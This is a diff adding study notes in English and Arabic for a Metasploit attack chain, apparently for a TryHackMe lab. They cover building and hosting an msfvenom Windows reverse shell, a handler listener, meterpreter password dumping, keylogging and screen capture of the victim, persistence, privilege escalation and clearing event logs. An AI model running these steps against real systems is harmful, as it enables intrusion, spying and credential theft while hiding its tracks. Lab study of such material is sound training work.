@@ -1,0 +1,68 @@
+# msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -f exe -o reverse.exe
+# sudo mkdir /var/www/html/share
+# sudo cp reverse.exe /var/www/html/share
+# service apache2 start
+
+# windows: ==> 192.168.2.5/share
+
+# Listner: جلسة الاستماع
+# msfconsole:
+# use exploit/multi/handler
+# set LHOST ...
+# set payload windows/shell_reverse_tcp
+# set LPORT ...
+# run
+==========================================
+# Post Exploitation ما بعد الاستغلال
+	- shell to meterpreter
+		# background ==> CTRL Z
+		# sessions
+		# sessions -i 1
+		# sessions -u 1
+	- meterpreter to shell
+		# shell
+		# exit
+	- local enumeration ---------->المعلومات ال اقدر اخدها من الجهاز
+		# getuid ----------> هيقولي اسم الجهاز
+		# getprivs ------------> عشان اعرف ايه الصلاحيات ال اليوزر يقدر يستخدمها
+		# sysinfo  ------------> معلومات عن النظام
+		# ps  ----> بيوريني الحاجات ال شغالة على الجهاز  --------> like task manger details
+		# screenshare  ------------> بيفتحلي استريم يوريني اليوزر بيعمل ايه
+		# screenshot  ------------> هياخدلي اسكرين شوت من جهتز الضحية
+		# hashdump  ------------> بيجبلي اليوزر بالباسورد بتاعه
+		# keyscan_start  ------------>
+		# keyscan_stop  ------------>
+		# keyscan_dump  ------------>
+	- maitain access تثبيت الدخول
+		# background
+		# search persistence
+		# use exploit/windows/local/persistence
+		# set SESSION 2
+		# run
+
+		# msfconsole
+		# use exploit/multi/handler
+		# set payload windows/meterpreter/reverse_tcp
+		# set LHOST ....
+		# run
+	- file transfer نقل الملفات
+		# download
+		# upload
+			- windows: ==> C:\TEMP
+			- Linux: ==> /tmp
+
+(-) ----------> دي بتعبر عن ان دة فايل
+d ---------> means direct
+		# d     rwx  |  r-x      |r-x -----> # - read write excute
+	        #      owner |Group-User | others
+		# 2+2
+	- privilege esclation رفع الصلاحيات
+		# background
+		# search suggester
+
+		# ps
+		# migrate ...
+	- remove logs ازالة الاثار
+		# clearev
+============================
+https://tryhackme.com/r/room/windows10privesc
